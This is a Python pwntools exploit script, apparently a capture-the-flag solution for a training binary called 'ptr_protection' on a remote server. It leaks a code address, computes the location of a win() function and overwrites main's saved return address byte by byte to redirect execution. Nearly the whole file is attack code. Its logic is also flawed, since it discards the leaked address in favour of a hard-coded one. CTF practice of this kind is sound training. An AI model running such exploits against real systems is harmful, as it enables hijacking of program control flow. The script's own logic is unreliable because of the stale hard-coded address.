from pwn import *

#First, I leak the address of text section by modifying only the last byte of sEIP of challenge() in order to
#go back before the call to challenge (printf prints the address). With gdb, i compute the offset between this address
#and win address and also of the input buffer and sEIP of main (because this isn't xored with canary). After compute
#these offset, I use as input the offset of input buffer computed before as index (from 104 to 109 with values, from 110 to 111
# with zeros --> IMPORTANT) and as values the decimal values of the bytes that compose the win address. Then when i press -1
# ìt returns correctly from challenge but when it returns from main it calls win function.

context.arch = 'amd64'

#p = process("./ptr_protection")
'''gdb.attach(p, """
    b challenge
    """)
input("wait")'''
p = remote("bin.training.offdef.it", 4202)
shellcode = b"40\n"
p.send(shellcode)
time.sleep(0.2)
shellcode = b"80\n"
p.send(shellcode)
time.sleep(0.2)
shellcode = b"-1\n"
p.send(shellcode)
time.sleep(0.2)

p.recvuntil(b"return 0x")
time.sleep(0.2)
address = p.read(12)
address_int = int(address, 16)
#print("address_int: ")
#print(address_int)


offset_win = 872  #offset between the address printed and the function win (got by gdb)
target_offset = 104  #offset among input buffer and sEIP of main
addr_to_write_int = address_int - offset_win

addr_to_write = addr_to_write_int.to_bytes(6, "little")
address = "5645ed385550"
n = int(address, 16)
n -=872
addr_to_write = n.to_bytes(6, "little")
for byte in addr_to_write:
    p.send(target_offset.to_bytes(1, "little"))
    time.sleep(0.2)
    p.send(byte.to_bytes(1, "little"))
    time.sleep(0.2)
    target_offset +=1

p.send(target_offset.to_bytes(1, "little"))
p.send(b"0\n")
target_offset +=1
time.sleep(0.2)
p.send(target_offset.to_bytes(1, "little"))
p.send(b"0\n")
time.sleep(0.2)
p.send(b"-1\n")

p.interactive()